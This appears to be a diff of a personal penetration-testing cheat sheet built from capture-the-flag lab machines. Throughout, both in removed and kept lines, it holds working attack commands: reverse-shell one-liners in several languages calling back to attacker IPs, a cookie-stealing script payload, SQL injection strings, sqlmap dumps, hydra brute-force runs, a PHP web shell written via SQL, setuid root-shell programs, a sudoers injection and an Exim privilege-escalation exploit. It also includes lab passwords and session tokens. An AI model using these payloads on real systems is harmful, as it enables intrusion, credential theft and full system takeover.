@@ -1,38 +1,12 @@
-ping sweep
+txt -m 6ping sweep
 
 #port scan
 nikto --host <ip address>
 ######__PYTHON__################
-	python -m SimpleHTTPServer 8000
-	python -m http.server
-	python sqlmap.py --url 192.168.0.107/imfadministrator/cms.php?pagename=home --cookie "PHPSESSID=vku9huomq3f52f9ljuqes53bn0" --level=2 -D mysql --tables --dump
-	python -c 'import pty;pty.spawn("/bin/bash")'
-
-------------------------------------
-#############__NMAP__
-  nmap -O -sV[service version detection]__ find operating system
-	nmap -p80 192.168.0.0/24 -oG – | nikto -h –
-	sudo nmap -p1-65535 -A -T4 -sS target_ip
-	nmap -T4 -A -v  192.168.0.109 -p- 
- ___port Knock
-	for x in 1466 67 1469 1514 1981 1986 1588; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 192.168.0.106; done
-	nmap --script smb-enum-shares.nse -p445 192.168.0.106
-===ping sweep
-	nmap -sn 192.168.0.100/24
-	nmap -Pn -n -A -sV 10.5.5.113 -p 1-65535
------------------------------------------------
-
-#80 is closed scan for NEW open tcp port
-####from the ~/opt/dirb directory
-nc -nlvvp 433
-#upload server
-#######Remember that the python upload server is at port 8000
 upload reverse
 ##ensure update file 777
 wget -O /tmp/reverse
 sudo -l ### reveal sudo powers
-sudo iptables -L --line-numbers
-sudo iptables -D INPUT 2
 irssi -c # connect pentest server
 #using vim as a set userid program
 #this info comes from sudo -l
@@ -49,11 +23,7 @@ echo -n aW1mYWRtaW5pc3RyYXRvcg== | base64 -D >> flags.txt
 http://192.168.0.105/imfadministrator/uploads/6b26454f2373.gif?file=echo%20%E2%80%9Cbash%20-i%20%3E&%20/dev/tcp/192.168.0.104/1234%200%3E&1%E2%80%9D%20%3E%3E%20%20/tmp/hell
 echo "bash -i >& /dev/tcp/192.168.0.104/1234 0>&1" > ./hell
 host <ip>
- sqlmap --url "http://nullbyte/kzMb5nVYJw/index.php" --data "usrtosearch=a" -D mysql --dump
-sqlmap --url "nullbyte/kzMb5nVYJw/420search.php?usrtosearch=a" --leve=2 -D seth -T users --dump --exclude-sysdbs
 cat /etc/services/<port number>
-curl 127.0.0.1:<port number>
-ltrace strings on binary
 cat <encode_file.txt>|base64 --decode > <ouput file or binary>
 eric@192.168.244.157
 enumerate smb
@@ -64,13 +34,8 @@ linux system info/user info
 #
 /opt/misc/priv.py
 ##########POSt
-sqlmap -u http://192.168.0.108/login.php --data "user=abc&password=def&s=submit" --cookie PHPSESSID=2t5ncd6bdgpf1firgev29uebe3  --dump --level=5 --risk=3
-curl -v -X POST -d "user=kent&pass=JWzXuBJJNy&submit=Login" "http://10.0.2.13/?page=login"
 
 ######Upload
- curl -v -X POST -H "Content-Type: multipart/form-data" -F "file=@test.gif;submit" -F "submit=Upload" -b "PHPSESSID=o0gujk45afugl9goa3d; path=/" "http://10.0.2.13/?page=upload"
-___________curl download file
-curl -O 192.168.0.200:8000/<semaphore>
 
 
 
@@ -79,93 +44,37 @@ curl -O 192.168.0.200:8000/<semaphore>
 notes use system program in a a script using the effective user id of the
 script 
 ##List Users
-wpscan --url <ip> --enumerate u
-exiftools <image file name>
-must add the below in order to install 
-plugin
-/*
-Plugin Name: Shelly
-Plugin URI: http://localhost  
-Description: Bla Bla Bla  
-Author: Pingmoose
-Version: 1.0.1  
-Author URI: http://localhost  
-*/
 
 
 
-password 13 characters in length starts with bev 
-crunch 13 13 -t bev,%%@@^1995 -o tommy.txt
-crack zip password protected files
-v- verbose
--D dictionary
--u unzip
--p use string as password file name
-
-fcrackzip -v -D -u -p tommy.txt t0msp4ssw0rdz.zip
 #####Crunch
-3 letter @
-4 digits %
-crunch 7 7 -t@@@%%%%
-starting with the letter m[2 unknown letters] followed by 4 digits
-crunch 7 7 -t m@@%%%%
 
 brute force wordpress users
-wpscan --url http://192.168.0.105/prehistoricforest/ --wordlist tommyboy.txt
-curl -X OPTIONS -v <ip>
 wget https://www.exploit-db.com/donwload/37292 --no-check-certificate-O ofs.c
 cate-O ofs.c
 
-perl -e 'use Socket;$i="192.168.0.104";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-hydra -l robhubbard -P password.txt 192.168.0.105  http-form-post "/commodore64/index.php:input_username=^USER^&input_password=^PASS^:Login system"
-
 ##############Mutillidae###########
-
-sqlmap.py --thread=10 --random-agent --url http://192.168.0.105 --data"usr=user*&pw=pw&commit=Login"
--Tusers --dump --level=5 --risk=3
 
 ' or 1=1#
 email=' || email LIKE '%';#
 
 #SQL injection
-'  -single quote
-' or 1=1 --  -comment mysql two hyphens and a space returns the first record
-' or (1=1 and username = 'jeremy') -- pick a user name
 for level one security javascript validation enter in innocuous
 alpha numeric then alter in brup suite
 ###########HERE IT IS##################
- hydra -t64 -L  ~/opt/db/names.txt -P ~/opt/db/passwds.txt localhost  http-form-post "/login.php?page=login:username=^USER^&password=^PASS^:Login=Login:F=Account does not exist:H=Cookie:PHPSESSID=0c80eca0e405b626a96a77eb4d814f43"
- hydra -l admin -p password  192.168.0.104 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=You have logged in as 'admin':H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
-hydra -l admin -p password  192.168.0.104 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&user_token=88f5dd9266d47bbbfc18ef849aabc5d1&Login=Login:S=You have logged in as 'admin':H=Cookie\: security=low;  PHPSESSID=44f4b6a30faab8df66dad625ebcde951"
-hydra -l admin -P ~/opt/password.txt -vV  127.0.0.1 http-post-form "/mutillid
-  ae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:Not Logged In"
 Windows Key
-################
 bd2T3pR1fu
 
-
 Assembly stuff
-#######
 apt-get install execstack
- gcc -o wack wack.c -no-pie -z execstack -fno-stack-protector
--mpreferred-stack-boundary=2 -ggdb
 #########as root
-echo 0 > /proc/sys/kernel/randomize_va_space
 sysctl -p
 #Dump core
 #:w
 #ulimit -c unlimited
 #system address
 #
-ulimit -s unlimited
-ulimit -c
-_____________look at core dump
-gdb -q -c core
-hung process
-gcore <pid>
-kill -ABRT <pid>
 
-hydra -l admin -P password.txt -f -v 191.168.124.123 http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&submit=Login:Login failed"
 http://192.168.0.106/uploadform.php?page=php://filter/convert.base64-encode/resource=index.php
 ########GDB
 x/1i $eip
@@ -178,9 +87,6 @@ int main() {
     ret = (int *)&ret + 2;
     (*ret) = (int)shellcode;
 }
-nasm -f elf exit.asm
-ld  -o exit exit.o
-objdump -d exit -this get the shellcode
 
 
 int main() {
@@ -188,27 +94,11 @@ int main() {
     ret = (int *)&ret + 2;
     (*ret) = (int)shellcode;
 }
- gcc -o wack wack.c -no-pie -z execstack -fno-stack-protector
-strace ./wack -determine if your exploit worked
-nmap -p- -T5 -A -v -sT 192.168.0.108
 ip -s link
 #####PING REVERSE SHELL
 sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
-perl -MCPAN -e shell 
-python -c print "A" * 512 | nc localhost 3333
 ######Find all setuserid programs
-find / -perm +6000 -type f 2>/dev/null
-find / -perm -4000 -user root 2>/dev/null
-find / -perm -2000 -type f 2>/dev/null
-sudo find / -perm -2 ! -type l -ls #file that can be written to
-> file redirects stdout to file
-1> file redirects stdout to file
-2> file redirects stderr to file
-&> file redirects stdout and stderr to file
-find / -perm +6000 -type f 2>/dev/null
 ##########Run command in background and discard stdout and stderr
-command > /dev/null 2>&1 &
-netstat -al --numeric-ports | grep LISTEN
 
 ps aux > /tmp/ps1
 ps aux > /tmp/ps2
@@ -218,51 +108,18 @@ upload file to server with ^  ^
 mysql >\! <command>
 
 
-find -perm +6000 -type f 2>/dev/null
-                           (@  @) 
-nc download
-_________________________
-server 
-_______
-nc -l 192.168.0.108 55555 < exploit_file
-client
-_________
-nc 192.168.0.108 5555 > exploit_file
-#############################
-######NET CAT BANNER GRAB
-nc  -v 192.168.0.106 80
-HEAD / HTTP/1.1
-#########nmap banner grab
-nmap -sV <ip address>
-#####Address bar reverse shell
-http://192.168.0.109/index.php?page=mailer&mail=bash%20-c%20%22bash%20-i%3E%26%2Fdev%2Ftcp%2F192.168.0.108%2f55555%200%3E%261%22
-http://192.168.0.108/index.php?page=mailer&mail=bash%20-c%20%22bash%20-i%3E%26%2Fdev%2Ftcp%2F192.168.0.200%2f4444%200%3E%261%22
-weevely remove.php extentsion add php extension after upload
-weevely generate <password><filename> no php extension
-chmod 777
-weevely <url><filename after added extension><password>
-
-#########Aes ecb -d
 
 echo wDOW0gW/QssEtq5Y3nHX4XlbH/Dnz27qHFhHVpMulJSyDCvex++YCd42tx7HKGgB openssl aes-128-ecb -d
 ##########Nikto Proxy
 
-nikto -host 192.168.0.109 -useproxy http://192.168.0.109:3129
 #######cewl with proxy
-cewl.rb --proxy_host 192.168.0.109 --proxy_port 3129 192.168.0.109/blog --write got.dict
-find / -writable -type d 2>/dev/null
 ##Set up a listener on  port 8000
 
 enter the below into input field and wait for the comeback
 <script>top.location="http://192.168.110.103:8000/" + document.cookie;</script>
 ####DIRBUSTER
- python dirs3arch.py -u https://192.168.0.108 -w db/dirbuster/directory-list-1.0.txt -e php
 ##########READ Remote Host File
-python -c 'print "\x01\x01flag.txtxxxxxx"' | nc 192.168.0.109 6969  | tee flag.txt
-cat exploit | nc 192.168.0.109 6969
-sshfs root@test.example.org:/var/www /mnt/sshfsmounts/www
 ###Large input for buffer overflow using python
- python -c 'print "A" * 20'  | ./demo
 
 cat /proc/self/maps
 #show memory layout 
@@ -270,16 +127,10 @@ can run gdb on pid
 gdb <executable name><pid>
 
 ______________GDB
- run $(python -c 'print "A" * 268 + "B" * 4')
- msfelfscan -j eax pwnme 
 
 Smash the tux
 ------------------
 __________________
-gcc pwnme.c -o pwnme -ggdb -fno-stack-protector
-msfvenom -p linux/x86/exec CMD=/bin/bash -f python -b '\x00'  
-cat authorized_keys --this will show which key file belongs to which user
-ssh -i <private key file> <server>
 
 ###list docker containers
 docker container ls
@@ -293,85 +144,38 @@ ps aux | grep nfs
 LFI/RFI
 
 #PULLING image from an external site
- curl -v http://192.168.0.109/image.php\?src\=/etc/passwd   
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.106",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-python wfuzz.py -c -z file,/opt/wordlists/rockyou.txt --hc 404  http://192.168.0.109:8008/NickIzL33t/FUZZ 
- wpscan --url http://192.168.110.103/prehistoricforest --wordlist /usr/share/ncrack/top50000.pwd --username tom
- ssh -l youruser yourhost.com -p 22 -N -f -C -L 3306:yourdbserver.com:3306
-cat exploit | nc 192.168.0.109 6969
-sshfs root@test.example.org:/var/www /mnt/sshfsmounts/www
-sqlmap -u ‘http://192.168.2.14/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user&#8217; -p add_value -D jabcd0cs –dump
-exiftool test.png
-dpkg --get-selections|grep 'linux-image*'|awk '{print $1}'|egrep -v "linux-image-$(uname -r)|linux-image-generic" |while read n;do apt-get -y remove $n;done
 #receiving end
 nc -l 6666 > bas
 sending end
 cat <file> bas | nc 192.168.0.106 1234
 check out kvasir
 mysql and netcat stuff
-curl -b cookie.txt <url>
 sudo arp-scan -l
-__________________use curl to form submit
- curl -X POST -F 'file=show.php' http://192.168.0.109/show.php > show.php
 
 #############Nmap vuln scanner
-/usr/local/share/nmap/scripts/vulscan ---script dir for updates
 
-nmap -sV --script=vulscan/vulscan.nse www.example.com
 
 apt install iscsi
 
 iscsiadm -m discovery -t st -p
 
 
-sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/local/bin/nmap
 
 
 
-''or'1'='1'
 ----------------Hydra phpmyadmin
-hydra -l root -P /opt/wordlists/big.txt -e ns -vV 192.168.56.20 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
 phpmyadmin console
 ___________
-SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
-http://192.168.56.20/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.0.101%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
 JOHNNY Boy
 _______
-john passwd.txt
 steghide --extract -sf Alfajet106.wav
 ruby -v -run -e httpd . -p 8000 
 
-nmap connect scan when too many ports are open
 ______________
-nmap -p1-65535 -A -T5 -sT 192.168.110.10
 add to the top of a wordpress "plugin"
-<?php
- 
-/*
-Plugin Name: Shelly
-Plugin URI: http://localhost  
-Description: Bla Bla Bla  
-Author: Pingmoose
-Version: 1.0.1  
-Author URI: http://localhost  
-*/
- 
-COPY CONTENTS OF shelly.php HERE
- 
-?>
 pings blocked
-nmap -T4 -Pn -v -p22 192.168.56.100
-knock 192.168.0.108 1,2,3
-nmap -sS -T4 -v -p- 192.168.0.108
 #command injection
 ; ls 
-#######Port knock with nmap
-for x in 3 2 1; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 192.168.0.109; done
-forensics tool
-________________________
-foremost
-
-s a console program to recover files based on their headers, footers, and internal data structures. This process is commonly referred to as data carving. Foremost can work on image files, such as those generated by dd, Safeback, Encase, etc, or directly on a drive. The headers and footers can be specified by a configuration file or you can use command line switches to specify built-in file types. These built-in types look at the data structures of a given file format allowing for a more reliable and faster recovery.
 
 unrar e 000000213.jpg
 unrar e lol.jpg
@@ -388,48 +192,25 @@ IMF
 ##############
 ______________
  cat /etc/services/7788
-knock 192.168.0.107 7482:tcp 8279:tcp 9467:tcp
-nmap -p 7788,22 192.168.0.107
-nc 192.168.0.107 7788
 
 
 How to crash
 create pattern 
-msf/tools/exploit/pattern_create.rb -l 1024
 ltrace agent <hit enter>
 agent id 48093572
 eax 0xffffcd04 
 seg fault address 0x41366641
 find the pattern offset
-msf/tools/exploit/pattern_offset.rb -l 1024 -q 0x41366641
-/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
-objdump -d agent > dump 
 grep call eax
 use peda jmpcall to eax
-python snip.py | ./agent
 0x8048563
-msf > use exploit/multi/handler
-portfwd add -l <local port on the attacking machine (yours)> -p <victim port we want to access> -r <victim IP address>
-
-msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-
-msf exploit(handler) > set LHOST 192.168.0.100
-
-msf exploit(handler) > set LPORT 4444
-
-msf exploit(handler) > set ExitOnSession false
-
-msf exploit(handler) > exploit -j 
 
 
 
 #victim machine
 portfwd -l 7788 -r 127.0.0.1
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOSTS=192.168.0.1O1 LPORT=4445 -b "\x00\x0a\x0d" -f python
 IMF sqlmap
 __________
-sqlmap --url 192.168.0.107/imfadministaror/cms.php\?pagename\=home  --cookie "PHPSESSID=kosuhtlade3e0fnrtdf3j16bu5"  -D mysql --tables --dump --level=5 --risk=3
-sqlmap --url 192.168.0.107/imfadministrator/cms.php\?pagename\=home  --cookie "PHPSESSID=kosuhtlade3e0fnrtdf3j16bu5"   --dump --level=5 --risk=3
 
 peda shell <execute command>
 b *0x9048f23 break at memory address
@@ -441,66 +222,15 @@ don't forget c for continue inside gdb
 context stack 25
 vmmap for libc
 find /bin/sh
-ssh no login
-ssh-copy-id -i ~/.ssh/id_rsa.pub remote-host
- ssh-add -L
-ssh-keygen -t rsa -C john
 remote server after+++++ cat john-key.pub > authorized_keys
-ssh john@192.168.0.109 -i john-key
 sudo -l
 sudo /usr/local/sbin/nfs start
 rpcinfo -p 192.168.0.109
 showmount -e 192.168.0.109
 sudo  mount 192.168.0.109:/opt/nfs /remotezen/nfs 
-cat > suid.c << _EOF
-int main(void) {
-       setgid(0); setuid(0);
-       execl("/bin/sh","sh",0); }
-_EOF
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
-
-int main() {
-seteuid(0, 0); 
-system("/bin/bash"); 
-}
-#include <stdio.h>
-#include <unistd.h>
-#include <stdlib.h>
-
-#//////////
-#_____________
-
-int main()
-{
-    setuid(0);
-    setgid(0);
-    system("/bin/sh");
-}
-
-#/////////
 kvasir
 SQL INJECTION//////
-1','1,NULL)--  #
 commix --url="http://192.168.110.103/admin.php" --data="service=apache2" --cookie="PHPSESSID=4v7qaj8kg9t66au04u22fjthk0; 1474544351=; 1474544398=; 1474545698=; 1474546238="
-
-
-
-
-
-start tor proxy
-sudo /etc/init.d/tor start
-ss -aln | grep 9050
-
-python -c 'print "AAAA" + "%p."*20' | /opt/bf `python -c 'print ",>"*100'`\#
-Global Offset Table (GOT
-objdump -R /opt/bf
-DirBuster
-______
-
-dirb  http://192.168.0.113 /remotezen/wordlists/darkc0de.lst -X .php,.html
-
 
 sudo locale-gen "en_US.UTF-8"
 sudo dpkg-reconfigure locales
@@ -512,123 +242,20 @@ __SHELLCODE x86
 ________________________________________
 
 
-
-___JOHN
-
-
-umask 077
-unshadow /etc/passwd /etc/shadow > passwd
-john passwd
-
-
-
-
-Ruby conversion
-________________
-
-pry >> 3192.to_s(16) get hex 
-hex to integer
-__________this hydra cracked dvwa
-Integer("7cb0",16)
-hydra 127.0.0.1 -V -l admin -P /remotezen/wordlists/big.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=lkjnhsemqtdno53qg75uv4d063; security=low"
-
-
-
-
-command injection
-
 1|ls
 1|pwd& whoami & ps aux
 1| uname -a & users& id &w
-1| ncat -v -e '/bin/bash' -l -p 4444
-
- union select null,table_name from information_schema.tables where table_cschema = 'noswap' 
 
 
 pyenv install --list
 
 lynis audit system
-
-
-
-	%' or '0'='0
-find all true records
-________________
-
-	%' or 0=0 union select null, version() #
-find db version
-______
-	
-	%' or 0=0 union select null, user() #
-find db user
-root@localhost
-
-______________-
-
-	%' or 0=0 union select null, database()#
-find db name
- dvwa
-
-________
-display all tables in database schema
-%' and 1=0 union select null, table_name from information_schema.tables#
-
-______________
-column names
-
-
-%' and 1=0 union, select null, concat(table_name, 0xa, column name) from information_schema.columns where table_name = 'users'#
- 
 ___________
 table data
 
-%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
-./john --format=raw-MD5 ~/tmp/password.txt --show
-
- ___________Sql Injection
-
-	%' or '0'='0
-find all true records
-________________
-
-	%' or 0=0 union select null, version() #
-find db version
-______
-	
-	%' or 0=0 union select null, user() #
-find db user
-root@localhost
-
-______________-
-
-	%' or 0=0 union select null, database()#
-find db name
- dvwa
-
-________
-display all tables in database schema
-%' and 1=0 union select null, table_name from information_schema.tables#
-
-______________
-column names
-
-
-%' and 1=0 union, select null, concat(table_name, 0xa, column name) from information_schema.columns where table_name = 'users'#
- 
-___________
-table data
-
-%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
-./john --format=raw-MD5 ~/tmp/password.txt --show
 acid reloaded
 
-sqlmap --url acid:33447/bin/l33t_haxor.php?id=  --cookie "sec_session_id=c7j85d7g4epfbuneg6r14n4v80"   --dump --level=5 --risk=3
 c7j85d7g4epfbuneg6r14n4v80
-hydra acid ssh -L username.txt -P username.txt -s 22
-sudo netstat -tulpn
-
-
-________PAPPYPROxy
 pappy -l
 find ids
 ++++++++ls
@@ -637,63 +264,18 @@ run shell command
 !<command>
 
 +++++++++++ic requests, responses <id>
-iptables -t nat -A PREROUTING -i ppp0 -p tcp --dport 80 -j REDIRECT --to-ports 8080
 to view full request/response
 
 +++++++++vfq <id>
 
 _________________send repeater <rp>
 leader<,><f>
-____________________-execute commandline php
-php -f <phpfilename.php>
-php -a ----------php interactive shell
-
-
 encode to html
-
-
-The perl CGI module has a escapeHTML function that makes it pretty easy:
-perl -e 'use CGI qw(escapeHTML); print escapeHTML("<hi>\n");'
-Or to do an entire file:
-perl -p -e 'BEGIN { use CGI qw(escapeHTML); } $_ = escapeHTML($_);'  FILENAME
-
-python urlencode
-import urllib
-urllib.quote_plus('`ls`')
-
-
-
-
-
-
-The perl CGI module has a escapeHTML function that makes it pretty easy:
-
-perl -e 'use CGI qw(escapeHTML); print escapeHTML("<hi>\n");'
-
-Or to do an entire file:
-
-perl -p -e 'BEGIN { use CGI qw(escapeHTML); } $_ = escapeHTML($_);'  FILENAME
-sql injection
-
-username: name" OR "1"="1
-password: pass" OR "1"="1
 scp level08@192.168.0.108:/home/flag08/capture.pcap .   
 _______________mysql from command line
 echo "SELECT hostname from sensor;" | mysql -u root -p snort
-ip route
 Environmental variables
-
-
-typeset
-printenv
-typeset type
-set -h track command line
-alias -r print all the aliases
-bash -
-base set -o posix
 ___UFW
-ufw allow from 192.168.0.0/24 to any port 8881
-ufw status numbered
 ___Old releases
 deb http://old-releases.ubuntu.com/ubuntu/ oneiric main
 deb-src http://old-releases.ubuntu.com/ubuntu/ oneiric main
@@ -715,15 +297,10 @@ mkisofs -b IVUJ11US.IMG  -o biosboot.iso IVUJ11US.IMG
 ____________wget with password username
  wget --user natas2 --password ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/pixel.png
 
-
-
-
 ________sneaky backdoor
 http://192.168.0.102/flicks/phpinfo.pht?ctime=system&atime=ls%20-la
 /\csneaky __________case insensitive search
 __________compile 32 on 64
-gcc -m32 overlay.c -o overlay 
-
 
 ___Mitmproxy with curl
 mitmproxy --socks -p 8881
@@ -742,20 +319,6 @@ sudo su
 cat /root/flag.txt
 
 
-Dear Hax0r,
-You have successfully completed the challenge.
-I  hope you like it.
-FLAG NAME: "Acid@Makke@Hax0r"
-Kind & Best Regards
--ACID
-facebook: https://facebook.com/m.avinash143
-
-_____________________ip <network up/down>
-
-ip link show eth0 
-sudo ip link set dev eth0 down
-sudo ip link set dev eth0 up
-
 
 __________spoof mac
 ++vendor and byte
@@ -773,54 +336,30 @@ get ebd.txt
 _______________MAKE A wordlist
 cat /root/rockyou.txt | grep veronica > veronica.txt
 
-ncrack -y veronica -P veronica.txt -T5 BBox -p 21
 aircrack-ng eg-01.cap -w /$WORDLISTS/rockyou.txt
 erics backdoor
 triscuit*
 ___Nmap udp tcp Hammer time
-necro sudo nmap nmap -sU -sT -n -r -T4 necro -p-  
 
 tcpdump -i eth0 -vv | tee -a dump.txt
 decompress bz2 bzip2 -d <file>.bz2
-ncrack -T4 -v -user margo  -P $WORDLISTS/phpbb.txt gibson:22
  sudo convert 'https://pwn.com"|echo '\''margo ALL=(ALL:ALL) ALL'\'' >> /etc/sudoers"' out.png
 ___WPSCAN brute
 
-wpscan -u robot/wp-admin --wordlist fsocity.dic --username elliot
 ++++++
 ___________works with mr robot
-____old version nmap
-nmap --interactive
-at nmap prompt
-!sh
-uname -an; id
 check out new group
 _____hydra
 
-hydra nullbyte http-post-form "/kzMb5nVYJw/index.php:key=^PASS^&Login:invalid key" -l null -P $PASSLIST
-__HTML nmap
 xalan -html -in pegasus_arp_scan.xml -out pegasus_arp.html
 ____________wireshark
-__reverse shells
-perl -e 'use Socket;$i="192.168.56.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-ruby -rsocket -e'f=TCPSocket.open("192.168.56.1",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-Java
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.56.1/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
-
-xterm -display 192.168.56.1:1
 
 
 
 ________sqlmap
 dump all databases
 
-sqlmap -u ‘http://192.168.2.14/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user&#8217; -p add_value –current-db
- sqlmap -v -u http://192.168.0.107/imfadministrator/cms.php\?pagename\=home --cookie "PHPSESSID=tbn4jch12210r7dc7pusdo9p16"  --dbs
 dump tables
-sqlmap -v -u http://192.168.0.107/imfadministrator/cms.php\?pagename\=home --cookie "PHPSESSID=tbn4jch12210r7dc7pusdo9p16" -D mysql --tables --dump --level=2 --risk=3
 tcpdump src <host ip>
 xalan -html -in pegasus_arp_scan.xml -out pegasus_arp.html
 _____hping3
@@ -833,21 +372,13 @@ hping3 -I eth0 -z -t 6 -S hacker -p 143
 hping3 -I eth0 -z -t 6 -S hacker -p 143
 
 _________Reverse engineering
-  hexdump test.bin test.hex
-get rid of first column
-
-cat test.hex | awk '{print substr($0, index($0,$2))}'
-$0 is the whole file 
 perl -e 'local $/; print unpack "H*", <>' file
 this was done on test.bin
 zico
 iconv -f ISO8859-1 -t UTF8 file.sql > file-utf8.sql
-hydra zico http-post-form "/dbadmin/test_db.php:password=^PASS^&remember=yes&submit=Log In&proc_name=true&Login:Incorrect Password" -l null -P $PASSLIST
 
 
 ___MORIA
-for port in 77 101 108 111 110;do xterm -T "listening on port ${port}" -hold -e ncat -klvp ${port} &;done
-
 ____________-
 
 cat /etc/fstab show mounted disks
@@ -862,10 +393,50 @@ _________/etc/shadown
     starts by $6$, SHA-512 is used.
   [+]On modern Linux systems, you want to avoid DES and MD5. DES algorithm for password encryption will limit the size of the password to 8 characters and is really easy to crack. MD5 doesn't present the same length weakness but is pretty quick to brute force compared to other algorithms. 
 
-_________-lsof
-lsof -i UDP -n -P
-lsof -i TCP -n -P
 very powerful
 nikto -h wally -port 60080 -root "/?page=" 
 __filter php bypass
 text/x-php
+____SCRATCH
+
+package root;
+use strict;
+use warnings;
+system("/bin/bash");
+PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim-4.84-7 -ps
+tar xvf backup.tar
+cd home/paul/keys
+chmod 600 id_key4
+in menu 
+edit file
+now in vim
+:set /bin/bash
+!bash
+got shell!!!
+find / -perm -4000 -ls 2/dev/null
+/usr/exim/bin/exim-4.84-7
+
+Exim < 4.86.2 - Privilege Escalation  | linux/local/39549.txt
+cp $PLATFORM/linux/local/39549.txt .
+cat > /tmp/root.pm << EOF
+package root;
+use strict;
+use warnings;
+
+system("/bin/bash")
+
+PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim-4.84-7 -ps
+got root
+
+
++++++++++++++++++++++++++++++
+____freedom fighting repo
+_SOCAT
+socat openssl-listen:443,reuseaddr,cert=server.pem,cafile=client.crt,method=TLS1 file:`tty`,raw,echo=0
+python dirsearch.py -u orcus -e php
+python dirsearch.py -u http://tommy:8008/NickIzL33t -e html -w $BIG 
+ wpscan --username bully --url http://192.168.56.223/bull/ --wordlist $LAB/words-john.txt --threads 10
+get rid of ^M
+%s/\r\(\n\)/\1/g
+misconfigured apache
+b374k.php.jpg
